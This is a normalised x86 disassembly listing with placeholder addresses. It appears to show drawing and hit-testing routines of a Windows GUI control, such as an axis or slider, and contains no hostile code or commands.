call sub_402990
test bl bl
je r-xdata
mov eax [ esi + 0xd4 ]
jmp r-xdata
cmp [ esi + 0x8d ] 0x0
jne r-xdata
mov eax [ esi + 0xd8 ]
jmp r-xdata
sub_466b88
push ebp
mov ebp esp
cmp [ eax + 0x8e ] 0x0
je r-xdata
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_466bf4
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_466bb0
jmp r-xdata
pop ebp
retn 0x8
sub_466bb0
push ebp
mov ebp esp
cmp [ eax + 0xe0 ] 0x0
je r-xdata
cmp [ eax + 0x20 ] 0x0
je r-xdata
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_466a3c
jmp r-xdata
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov dl [ eax + 0x8d ]
call sub_466c3c
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov dl 0x1
call sub_466abc
jmp r-xdata
pop ebp
retn 0x8
sub_466bf4
push ebp
mov ebp esp
cmp [ eax + 0xe0 ] 0x0
je r-xdata
cmp [ eax + 0x20 ] 0x0
je r-xdata
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_466a3c
jmp r-xdata
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov dl [ eax + 0x8d ]
xor dl 0x1
call sub_466c3c
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
xor edx edx
call sub_466abc
jmp r-xdata
pop ebp
retn 0x8
sub_466c3c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov ebx edx
mov esi eax
fld [ esi + 0xc0 ]
fcomp [ r-xdata ]
fnstsw ax
sahf
jne r-xdata
fld [ ebp + 0x8 ]
fsub [ esi + 0xb8 ]
fild [ esi + 0xdc ]
fmulp st1
fdiv [ esi + 0xc0 ]
fstp [ ebp - 0x8 ]
fwait
fld [ ebp - 0x8 ]
fabs
fld [ r-xdata ]
fcompp
fnstsw ax
sahf
ja r-xdata
mov eax [ esi + 0xcc ]
jmp r-xdata
test bl bl
je r-xdata
mov eax [ esi + 0xcc ]
jmp r-xdata
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
fld [ ebp - 0x8 ]
call sub_402990
add eax [ esi + 0xd4 ]
fld [ ebp - 0x8 ]
call sub_402990
push eax
mov eax [ esi + 0xd8 ]
pop edx
sub eax edx
jmp r-xdata
sub_466cd4
push ebx
push esi
push edi
push ebp
add esp 0xffffffdc
mov [ esp + 0x4 ] ecx
mov [ esp ] edx
mov ebx eax
mov edx ebx
mov eax [ ebx + 0x90 ]
call sub_46d390
test al al
je r-xdata
xor eax eax
mov eax [ ebx + 0xd8 ]
mov edx [ ebx + 0xd4 ]
cmp eax edx
jge r-xdata
mov esi edx
mov ebp eax
mov esi eax
mov ebp edx
jmp r-xdata
mov edi edx
sub edi [ rw-data ]
mov [ esp + 0x8 ] eax
mov edi eax
add edx [ rw-data ]
mov [ esp + 0x8 ] edx
jmp r-xdata
mov eax [ ebx + 0x5c ]
mov edx [ ebx + 0x2c ]
cmp eax edx
jge r-xdata
push ebp
lea eax [ esp + 0x10 ]
push eax
mov ecx [ esp + 0x10 ]
mov edx esi
mov eax edi
call sub_412be0
mov eax [ esp + 0x8 ]
push eax
lea eax [ esp + 0x10 ]
push eax
mov ecx ebp
mov edx edi
mov eax esi
call sub_412be0
jmp r-xdata
cmp [ ebx + 0x8e ] 0x0
je r-xdata
add esp 0x24
pop ebp
pop edi
pop esi
pop ebx
retn
lea ecx [ esp + 0x1c ]
mov edx [ esp + 0x4 ]
mov eax [ esp ]
call sub_412bb8
push [ esp + 0x20 ]
push [ esp + 0x20 ]
lea eax [ esp + 0x14 ]
push eax
call PtInRect
cmp eax 0x1
sbb eax eax
inc eax
jmp r-xdata
sub_466dcc
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi edx
mov ebx eax
mov [ ebp - 0x4 ] esi
fild [ ebp - 0x4 ]
fld [ r-xdata ]
fmulp st1
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
fmul [ eax + 0x98 ]
call sub_402990
add eax ebx
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov [ edx + 0xd4 ] eax
mov [ ebp - 0x4 ] esi
fild [ ebp - 0x4 ]
fld [ r-xdata ]
fmulp st1
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
fmul [ eax + 0xa0 ]
call sub_402990
add ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov [ eax + 0xd8 ] ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_466e44
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x90 ]
mov edx [ ebp - 0x4 ]
cmp [ edx + 0x8e ] 0x0
je r-xdata
push ebp
mov edx [ eax + 0x244 ]
mov eax [ eax + 0x292 ]
call sub_466dcc
pop ecx
push ebp
mov edx [ eax + 0x240 ]
mov eax [ eax + 0x28e ]
call sub_466dcc
pop ecx
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_466da0
pop ecx
pop ebp
retn
sub_466e94
push ebx
push esi
push edi
push ebp
push ecx
mov edi edx
mov ebp eax
mov edx edi
fld [ ebp + 0xa8 ]
fcomp [ r-xdata ]
fnstsw ax
sahf
je r-xdata
mov eax edx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov bl [ ebp + 0x8e ]
test bl bl
je r-xdata
mov esi [ ecx + 0x8 ]
sub esi [ ecx ]
mov esi [ ecx + 0xc ]
sub esi [ ecx + 0x4 ]
jmp r-xdata
test bl bl
je r-xdata
neg esi
fld [ r-xdata ]
fmul [ ebp + 0xa8 ]
mov [ esp ] esi
fild [ esp ]
fmulp st1
call sub_402990
mov esi eax
cmp [ ebp + 0x8f ] 0x0
je r-xdata
lea edx [ esi + edi ]
neg esi
sub_466f10
cmp [ eax + 0x8f ] 0x0
je r-xdata
cmp [ eax + 0x8e ] 0x0
je r-xdata
cmp [ eax + 0x8e ] 0x0
je r-xdata
mov eax [ edx ]
mov eax [ edx + 0xc ]
jmp r-xdata
mov eax [ edx + 0x8 ]
retn
mov eax [ edx + 0x4 ]
jmp r-xdata
retn
sub_466f64
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
mov eax [ eax - 0x4 ]
mov esi [ eax + 0x90 ]
mov eax [ esi + 0x288 ]
mov [ ebp - 0x8 ] eax
lea ebx [ esi + 0x28e ]
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0xe0 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x8e ] 0x0
je r-xdata
mov eax [ ebx + 0xc ]
push eax
mov eax [ ebp - 0x4 ]
push eax
mov ecx [ ebx + 0x4 ]
mov edx [ ebx ]
mov eax [ ebp - 0x8 ]
mov esi [ eax ]
call [ esi + 0xd4 ]
mov eax [ ebx + 0xc ]
push eax
mov eax [ ebp - 0x4 ]
push eax
mov ecx [ ebx + 0x8 ]
mov edx [ ebx ]
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0xd0 ]
jmp r-xdata
cmp [ esi + 0x278 ] 0x0
je r-xdata
cmp [ esi + 0x278 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
push eax
mov ecx [ ebx + 0x8 ]
mov edx [ ebx ]
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x6c ]
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x8f ] 0x0
je r-xdata
mov eax [ ebx + 0xc ]
push eax
mov ecx [ ebx + 0x4 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x74 ]
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x8f ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
push eax
mov eax [ esi + 0x280 ]
push eax
mov ecx [ ebx + 0x8 ]
mov edx [ ebx ]
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0xd0 ]
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ ebx + 0xc ]
push eax
mov eax [ esi + 0x280 ]
push eax
mov ecx [ ebx + 0x4 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0xd4 ]
jmp r-xdata
mov eax [ ebp - 0x4 ]
push eax
push 0x0
mov ecx [ ebx + 0x8 ]
mov edx [ ebx ]
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0xd0 ]
jmp r-xdata
push 0x0
mov eax [ esi + 0x280 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ eax + 0x2c ]
mov ecx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
mov edi [ eax ]
call [ edi + 0xd8 ]
mov eax [ ebp - 0x4 ]
push eax
mov eax [ esi + 0x280 ]
push eax
mov ecx [ ebx + 0x8 ]
mov edx [ ebx ]
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0xd0 ]
jmp r-xdata
mov eax [ ebx + 0xc ]
push eax
push 0x0
mov ecx [ ebx + 0x4 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0xd4 ]
jmp r-xdata
push 0x0
mov eax [ esi + 0x280 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx [ eax + 0x2c ]
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
mov edi [ eax ]
call [ edi + 0xd8 ]
mov eax [ ebx + 0xc ]
push eax
mov eax [ esi + 0x280 ]
push eax
mov ecx [ ebx + 0x4 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0xd4 ]
jmp r-xdata
sub_467160
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
mov edi [ edi + 0x8 ]
add edi 0xfffffffc
mov eax [ edi ]
mov esi [ eax + 0x90 ]
mov ebx [ esi + 0x288 ]
mov eax [ ebx + 0x10 ]
mov dl 0x1
call sub_41d734
mov dl 0x1
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x1c ]
mov eax [ edi ]
mov edx [ eax + 0x3c ]
mov eax ebx
call sub_45c8bc
mov edx [ ebx + 0xc ]
mov eax esi
call sub_4619b0
mov eax [ ebx + 0xc ]
call sub_41d308
cmp eax 0x20000000
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
mov esi [ eax - 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax [ ebx + 0xc ]
mov edx 0x808080
call sub_41d310
mov eax [ edi ]
mov eax [ eax + 0x90 ]
mov eax [ eax + 0x288 ]
mov dl 0x2
mov ecx [ eax ]
call [ ecx + 0x1c ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
inc esi
xor ebx ebx
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
mov eax [ eax - 0xc ]
mov eax [ eax + ebx * 4 ]
call sub_466f64
pop ecx
test ebx ebx
jle r-xdata
mov eax [ edi ]
cmp [ eax + 0x40 ] 0x0
je r-xdata
inc ebx
dec esi
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
mov eax [ eax - 0xc ]
mov eax [ eax + ebx * 4 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx + 0x8 ]
mov edx [ edx - 0xc ]
add eax [ edx + ebx * 4 - 0x4 ]
mov [ ebp - 0x4 ] eax
fild [ ebp - 0x4 ]
fmul [ r-xdata ]
call sub_402990
call sub_466f64
pop ecx
jmp r-xdata
sub_467250
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx + 0x8 ]
mov ecx [ ecx - 0x4 ]
mov esi [ ecx + 0x90 ]
mov edi [ esi + 0x288 ]
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx + 0x8 ]
mov ecx [ ecx - 0x4 ]
cmp [ ecx + 0xe0 ] 0x0
je r-xdata
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx + 0x8 ]
mov ecx [ ecx - 0x4 ]
cmp [ ecx + 0x8f ] 0x0
je r-xdata
mov ecx [ esi + 0x29a ]
push ecx
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx [ eax + 0x2c ]
add ecx edx
add ecx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
mov eax [ eax - 0x4 ]
add edx [ eax + 0x2c ]
mov eax edi
mov ebx [ eax ]
call [ ebx + 0xd0 ]
jmp r-xdata
mov ecx [ ebp + 0x8 ]
add edx [ ecx - 0x4 ]
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx + 0x8 ]
mov ecx [ ecx - 0x4 ]
cmp [ ecx + 0x8e ] 0x0
je r-xdata
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx + 0x8 ]
mov ecx [ ecx - 0x4 ]
cmp [ ecx + 0x8e ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
push eax
push 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
mov eax [ eax - 0x4 ]
mov esi [ eax + 0x2c ]
sub esi edx
mov ecx esi
sub ecx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
mov edx esi
mov eax edi
mov ebx [ eax ]
call [ ebx + 0xd0 ]
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx + 0x8 ]
mov ecx [ ecx - 0x4 ]
mov esi [ ecx + 0x2c ]
add esi edx
mov ecx esi
add ecx [ ebp - 0x4 ]
push ecx
push 0x0
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx + 0x8 ]
mov ecx esi
mov edx edi
xchg edx eax
mov ebx [ eax ]
call [ ebx + 0xd4 ]
jmp r-xdata
push eax
mov eax [ esi + 0x280 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx [ eax + 0x2c ]
add ecx edx
add ecx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
mov eax [ eax - 0x4 ]
add edx [ eax + 0x2c ]
mov eax edi
mov ebx [ eax ]
call [ ebx + 0xd0 ]
jmp r-xdata
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx + 0x8 ]
mov ecx [ ecx - 0x4 ]
mov ecx [ ecx + 0x2c ]
sub ecx edx
sub ecx [ ebp - 0x4 ]
push ecx
mov ecx [ esi + 0x280 ]
push ecx
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx + 0x8 ]
mov ecx [ ecx - 0x4 ]
mov ecx [ ecx + 0x2c ]
sub ecx edx
mov edx edi
xchg edx eax
mov ebx [ eax ]
call [ ebx + 0xd4 ]
jmp r-xdata
sub_4673b4
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
mov eax [ eax - 0x4 ]
mov ebx [ eax + 0x90 ]
mov esi [ ebx + 0x288 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0xe0 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x8e ] 0x0
je r-xdata
lea eax [ ebx + 0x28e ]
mov [ ebp - 0x8 ] eax
mov edx [ ebx + 0x2f4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0xf8 ]
mov edx [ ebp - 0x8 ]
add eax [ edx + 0xc ]
mov [ ebp - 0x4 ] eax
push 0x0
mov eax [ ebp - 0x8 ]
mov edx [ eax + 0x8 ]
mov ecx [ ebp - 0x4 ]
mov eax esi
mov edi [ eax ]
call [ edi + 0xec ]
mov eax [ ebx + 0x280 ]
push eax
mov eax [ ebp - 0x8 ]
mov edx [ eax + 0x8 ]
mov ecx [ ebp - 0x4 ]
mov eax esi
mov ebx [ eax ]
call [ ebx + 0xf0 ]
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x8f ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x8f ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov edx [ ebx + 0x2f4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0xf8 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx + 0x8 ]
mov edx [ edx - 0x4 ]
add eax [ edx + 0xd8 ]
push eax
push 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ eax + 0x2c ]
mov eax [ ebp + 0x8 ]
sub edx [ eax - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx [ eax + 0xd4 ]
mov eax esi
mov ebx [ eax ]
call [ ebx + 0xd4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0xd8 ]
push eax
mov eax [ ebx + 0x280 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx [ eax + 0xd4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ eax + 0x2c ]
mov eax esi
mov ebx [ eax ]
call [ ebx + 0xd4 ]
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x2c ]
mov edx [ ebp + 0x8 ]
add eax [ edx - 0x4 ]
push eax
push 0x0
mov edx [ ebx + 0x2f8 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0xf8 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx + 0x8 ]
mov edx [ edx - 0x4 ]
mov edx [ edx + 0xd4 ]
sub edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx [ eax + 0xd8 ]
mov eax esi
mov ebx [ eax ]
call [ ebx + 0xd0 ]
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x2c ]
push eax
mov eax [ ebx + 0x280 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx [ eax + 0xd8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ eax + 0xd4 ]
mov eax esi
mov ebx [ eax ]
call [ ebx + 0xd0 ]
jmp r-xdata
sub_46759c
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
mov edx [ edx + 0x8 ]
mov edx [ edx + 0x8 ]
mov edx [ edx - 0x4 ]
cmp [ edx + 0x8e ] 0x0
je r-xdata
mov edx [ ebp + 0x8 ]
mov edx [ edx + 0x8 ]
mov edx [ edx + 0x8 ]
mov edx [ edx - 0x4 ]
cmp eax [ edx + 0xd4 ]
jle r-xdata
mov edx [ ebp + 0x8 ]
mov edx [ edx + 0x8 ]
mov edx [ edx + 0x8 ]
mov edx [ edx - 0x4 ]
cmp eax [ edx + 0xd4 ]
jle r-xdata
xor edx edx
jmp r-xdata
mov edx [ ebp + 0x8 ]
mov edx [ edx + 0x8 ]
mov edx [ edx + 0x8 ]
mov edx [ edx - 0x4 ]
cmp eax [ edx + 0xd8 ]
jl r-xdata
xor edx edx
jmp r-xdata
mov edx [ ebp + 0x8 ]
mov edx [ edx + 0x8 ]
mov edx [ edx + 0x8 ]
mov edx [ edx - 0x4 ]
cmp eax [ edx + 0xd8 ]
jl r-xdata
test dl dl
je r-xdata
mov dl 0x1
mov dl 0x1
jmp r-xdata
pop ebp
retn
mov edx [ ebp + 0x8 ]
cmp [ edx - 0x1 ] 0x0
je r-xdata
mov edx [ ebp + 0x8 ]
mov edx [ edx + 0x8 ]
push edx
mov edx [ ebp + 0x8 ]
mov edx [ edx + 0x8 ]
mov edx [ edx + 0x8 ]
mov edx [ edx - 0x4 ]
mov ecx [ edx + 0x74 ]
mov edx 0x1
call sub_467250
pop ecx
mov edx [ ebp + 0x8 ]
mov edx [ edx + 0x8 ]
push edx
call sub_466f64
pop ecx
jmp r-xdata
sub_467654
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
push edi
mov [ ebp - 0x1 ] al
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
cmp [ eax - 0x8 ] 0x1
jle r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
mov eax [ eax - 0x8 ]
dec eax
test eax eax
jle r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x20 ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov [ ebp - 0x1c ] eax
mov edi 0x1
mov edx [ ebp + 0x8 ]
mov edx [ edx + 0x8 ]
mov edx [ edx - 0xc ]
mov edx [ edx + 0x4 ]
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx + 0x8 ]
mov ecx [ ecx - 0xc ]
sub edx [ ecx ]
mov [ ebp - 0x20 ] edx
fild [ ebp - 0x20 ]
fmul [ r-xdata ]
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x70 ]
mov edx eax
inc edx
mov [ ebp - 0x24 ] edx
fild [ ebp - 0x24 ]
fdivp st1
fstp [ ebp - 0x10 ]
fwait
mov edx [ ebp + 0x8 ]
mov edx [ edx + 0x8 ]
test eax eax
jle r-xdata
mov edx [ ebp + 0x8 ]
mov edx [ edx + 0x8 ]
mov edx [ edx - 0xc ]
mov edx [ edx + edi * 4 ]
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx + 0x8 ]
mov ecx [ ecx - 0xc ]
sub edx [ ecx + edi * 4 - 0x4 ]
mov [ ebp - 0x20 ] edx
fild [ ebp - 0x20 ]
fmul [ r-xdata ]
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x70 ]
mov edx eax
inc edx
mov [ ebp - 0x24 ] edx
fild [ ebp - 0x24 ]
fdivp st1
fstp [ ebp - 0x10 ]
fwait
mov edx [ ebp + 0x8 ]
mov edx [ edx + 0x8 ]
mov ebx eax
test ebx ebx
jle r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
mov eax [ eax - 0xc ]
mov edx [ eax + edi * 4 - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_464fa8
fstp [ ebp - 0x18 ]
fwait
mov edx [ ebp + 0x8 ]
mov edx [ edx + 0x8 ]
mov edx [ edx - 0x4 ]
fild [ edx + 0x24 ]
fmul [ ebp - 0x18 ]
fsub [ ebp - 0x18 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x70 ]
mov edx eax
inc edx
mov [ ebp - 0x20 ] edx
fild [ ebp - 0x20 ]
fdivp st1
fstp [ ebp - 0x10 ]
fwait
mov edx [ ebp + 0x8 ]
mov edx [ edx + 0x8 ]
mov ebx eax
test ebx ebx
jle r-xdata
mov [ ebp - 0x1c ] eax
mov edi 0x1
inc edi
dec [ ebp - 0x1c ]
jne r-xdata
mov esi 0x1
fld [ ebp - 0x18 ]
fadd [ ebp - 0x10 ]
fstp [ ebp - 0x18 ]
fwait
fld [ ebp - 0x18 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
mov eax [ eax - 0x4 ]
fcomp [ eax + 0xb0 ]
fnstsw ax
sahf
ja r-xdata
push ebp
mov [ ebp - 0x20 ] edi
fild [ ebp - 0x20 ]
fmul [ ebp - 0x10 ]
call sub_402990
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
mov eax [ eax - 0xc ]
mov eax [ eax ]
sub eax ebx
call sub_46759c
pop ecx
push ebp
mov [ ebp - 0x20 ] edi
fild [ ebp - 0x20 ]
fmul [ ebp - 0x10 ]
call sub_402990
mov eax ebx
mov edx [ ebp + 0x8 ]
mov edx [ edx + 0x8 ]
mov edx [ edx - 0x8 ]
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx + 0x8 ]
mov ecx [ ecx - 0xc ]
add eax [ ecx + edx * 4 - 0x4 ]
call sub_46759c
pop ecx
inc edi
dec [ ebp - 0x1c ]
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x20 ] 0x0
je r-xdata
push ebp
mov [ ebp - 0x20 ] esi
fild [ ebp - 0x20 ]
fmul [ ebp - 0x10 ]
call sub_402990
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
mov eax [ eax - 0xc ]
mov eax [ eax + edi * 4 ]
pop edx
sub eax edx
call sub_46759c
pop ecx
inc esi
dec ebx
jne r-xdata
push ebp
push [ ebp - 0x14 ]
push [ ebp - 0x18 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_466b88
call sub_46759c
pop ecx
dec ebx
jne r-xdata
jmp r-xdata
sub_467888
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov edi edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x21 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x90 ]
mov eax [ eax + 0x288 ]
mov edx [ ebp - 0x4 ]
call sub_45c8bc
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
mov ebx [ eax - 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
mov eax [ eax - 0xc ]
mov eax [ eax + esi * 4 ]
mov ecx [ ebp - 0x8 ]
mov edx edi
call sub_467250
pop ecx
inc esi
dec ebx
jne r-xdata
sub_4678f8
push ebp
mov ebp esp
push ebx
mov ebx edx
mov edx [ ebp + 0x8 ]
mov edx [ edx + 0x8 ]
cmp [ edx - 0x8 ] 0x0
jle r-xdata
pop ebx
pop ebp
retn
cmp [ eax + 0x21 ] 0x0
je r-xdata
mov edx [ ebp + 0x8 ]
mov edx [ edx + 0x8 ]
mov edx [ edx - 0x4 ]
mov edx [ edx + 0x90 ]
mov edx [ edx + 0x288 ]
xchg edx eax
call sub_45c8bc
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_467654
pop ecx
sub_46793c
push ebp
mov ebp esp
push ecx
push ebx
mov ebx [ ebp + 0x8 ]
add ebx 0xfffffffc
mov edx [ ebx ]
mov eax [ ebx ]
mov eax [ eax + 0x90 ]
mov ecx [ eax ]
call [ ecx + 0xf8 ]
mov [ ebp - 0x4 ] eax
mov eax [ ebx ]
mov eax [ eax + 0x28 ]
cmp [ eax + 0x21 ] 0x0
je r-xdata
push ebp
mov eax [ ebx ]
mov ecx [ eax + 0x88 ]
mov eax [ ebx ]
mov eax [ eax + 0x7c ]
mov edx 0x1
call sub_467888
pop ecx
mov eax [ ebx ]
mov eax [ eax + 0x3c ]
cmp [ eax + 0x21 ] 0x0
je r-xdata
mov edx eax
mov eax [ ebx ]
mov eax [ eax + 0x90 ]
mov eax [ eax + 0x288 ]
call sub_45c8bc
push ebp
call sub_4673b4
pop ecx
push ebp
mov eax [ ebx ]
mov ecx [ eax + 0x84 ]
neg ecx
mov eax [ ebx ]
mov eax [ eax + 0x80 ]
or edx 0xffffffff
call sub_467888
pop ecx
push ebp
mov eax [ ebx ]
mov eax [ eax + 0x78 ]
xor edx edx
call sub_4678f8
pop ecx
push ebp
mov eax [ ebx ]
mov eax [ eax + 0x6c ]
mov dl 0x1
call sub_4678f8
